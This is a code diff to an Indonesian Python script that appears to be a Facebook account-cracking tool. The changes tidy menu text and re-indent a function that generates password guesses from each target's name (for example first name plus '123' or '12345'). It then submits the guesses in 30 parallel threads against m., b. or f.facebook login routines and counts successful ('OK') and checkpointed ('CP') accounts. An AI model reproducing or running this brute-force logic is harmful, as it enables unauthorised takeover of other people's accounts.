@@ -269,7 +269,7 @@ def menu(id):
 	banner()
 	iplu = requests.get("https://api.ipify.org").text
 	gpp = []
-	gpp.append(panel(f'[cyan]Nama   : Tarista Raya\nUid    : {id}\nLahir  : 09/01/2000  ',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
+	gpp.append(panel(f'[cyan]Nama   : -\nUid    : {id}\nLahir  : -  ',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
 	gpp.append(panel(f'[cyan]Author   : Muh Basari\nUip      : {iplu}\nTanggal  : {tgl} {bln} {thn}',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
 	ba.print(Columns(gpp))
 	cetak(panel(f'\t                  [cyan] Menu Script',width=70,title=f"",style=f"{warna_kolor}"))
@@ -287,24 +287,24 @@ def menu(id):
 		authorbas()
 	elif ______muhammad______basari______ in ['00','0']:
 		os.system('rm -rf .cok.txt && rm -rf .token.txt')
-		basari_tamvan(f'└── {bas}Sukses Logout{x} ')
+		basari_tamvan(f'└── Sukses Logout{x} ')
 		time.sleep(4)
 		exit()
 	else:
-		basari_tamvan(f'└── {bas}Pilih Yang Bener')
+		basari_tamvan(f'└── Pilih Yang Bener')
 		time.sleep(4)
 		back()
 def authorbas():
-	basari_tamvan(f'└── {bas}Tunggu Sebentar Nanti Diarahin Ke Facebook  {x}')
+	basari_tamvan(f'└── Tunggu Sebentar Nanti Diarahin Ke Facebook  {x}')
 	time.sleep(4)
 	os.system("xdg-open https://www.facebook.com/basari.shp")
 	back()
 def dump_pengikut():
-	basari_tamvan(f'└──{bas} Maaf Fitur Ini Masih Dalam Perbaikan  {x}')
+	basari_tamvan(f'└── Maaf Fitur Ini Masih Dalam Perbaikan  {x}')
 	time.sleep(4)
 	back()
 def dump_grup():
-	basari_tamvan(f'└──{bas} Maaf Fitur Ini Masih Dalam Perbaikan  {x}')
+	basari_tamvan(f'└── Maaf Fitur Ini Masih Dalam Perbaikan  {x}')
 	time.sleep(4)
 	back()
 	
@@ -536,49 +536,50 @@ def wordlist():
 	prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(bar_width=23),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
 	des = prog.add_task('',total=len(id2))
 	with prog:
-	with tred(max_workers=30) as pool:
-		for basid in id2:
-			idf,nmf = basid.split('|')[0],basid.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
-			pwv = []
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
+		with tred(max_workers=30) as pool:
+			for bazid in id2:
+				idf,nmf = bazid.split('|')[0],bazid.split('|')[1].lower()
+				frs = nmf.split(' ')[0]
+				pwv = []
+				if len(nmf)<6:
+					if len(frs)<3:
+						pass
+					else:
+						pwv.append(nmf)
+						pwv.append(frs+'321')
+						pwv.append(frs+'123')
+						pwv.append(frs+'12345')
 				else:
-					pwv.append(frs+'321')
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
+					if len(frs)<3:
+						pwv.append(nmf)
+					else:
+						pwv.append(nmf)
+						pwv.append(frs+'321')
+						pwv.append(frs+'123')
+						pwv.append(frs+'12345')
+				if 'ya' in pwt:
+					for xpwn in pwn:
+						pwv.append(xpwn)
+					else:pass
+				if 'm.facebook' in basari:
+					pool.submit(crackm,idf,pwv)
+				elif 'b.facebook' in basari:
+					pool.submit(crackb,idf,pwv)
+				elif 'f.facebook' in basari:
+					pool.submit(crackf,idf,pwv)
 				else:
-					pwv.append(nmf)
-					pwv.append(frs+'321')
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-			if 'ya' in pwt:
-				for xpwn in pwn:
-					pwv.append(xpwn)
-			else:pass
-			if 'm.facebook' in basari:
-				pool.submit(crackm,idf,pwv)
-			elif 'b.facebook' in basari:
-				pool.submit(crackb,idf,pwv)
-			elif 'f.facebook' in basari:
-				pool.submit(crackf,idf,pwv)
-			else:
-				pool.submit(crackf,idf,pwv)
-	print('')
-	cetak(panel(f'[bold green]SUKSES CRACK',width=70,title=f"",style=f"{warna_kolor}"))
-	print('')
-	print(f'{h} OK : {h}%s '%(ok))
-	print(f'{k} CP : {k}%s{x} '%(cp))
-	print('')
+					pool.submit(crackf,idf,pwv)
+		print('')
+		cetak(panel(f'[bold green]CRACK SELESAI',width=70,title=f"",style=f"{warna_kolor}"))
+		print('')
+		print(f'{h} OK : {h}%s '%(ok))
+		print(f'{k} CP : {k}%s{x} '%(cp))
+		print('')
 	
 #
 def crackm(idf,pwv):
 	global loop,ok,cp
-	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
+	prog.update(des,description=f"[white]crack m {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
 	prog.advance(des)
 	ua = random.choice(ugenm)
 	ses = requests.Session()
@@ -616,7 +617,7 @@ def crackm(idf,pwv):
 #
 def crackb(idf,pwv):
 	global loop,ok,cp
-	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
+	prog.update(des,description=f"[white]crack b {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
 	prog.advance(des)
 	ua = random.choice(ugenb)
 	ses = requests.Session()
@@ -667,7 +668,7 @@ def crackb(idf,pwv):
 #
 def crackf(idf,pwv):
 	global loop,ok,cp
-	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
+	prog.update(des,description=f"[white]crack f {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
 	prog.advance(des)
 	ua = random.choice(ugenf)
 	ses = requests.Session()
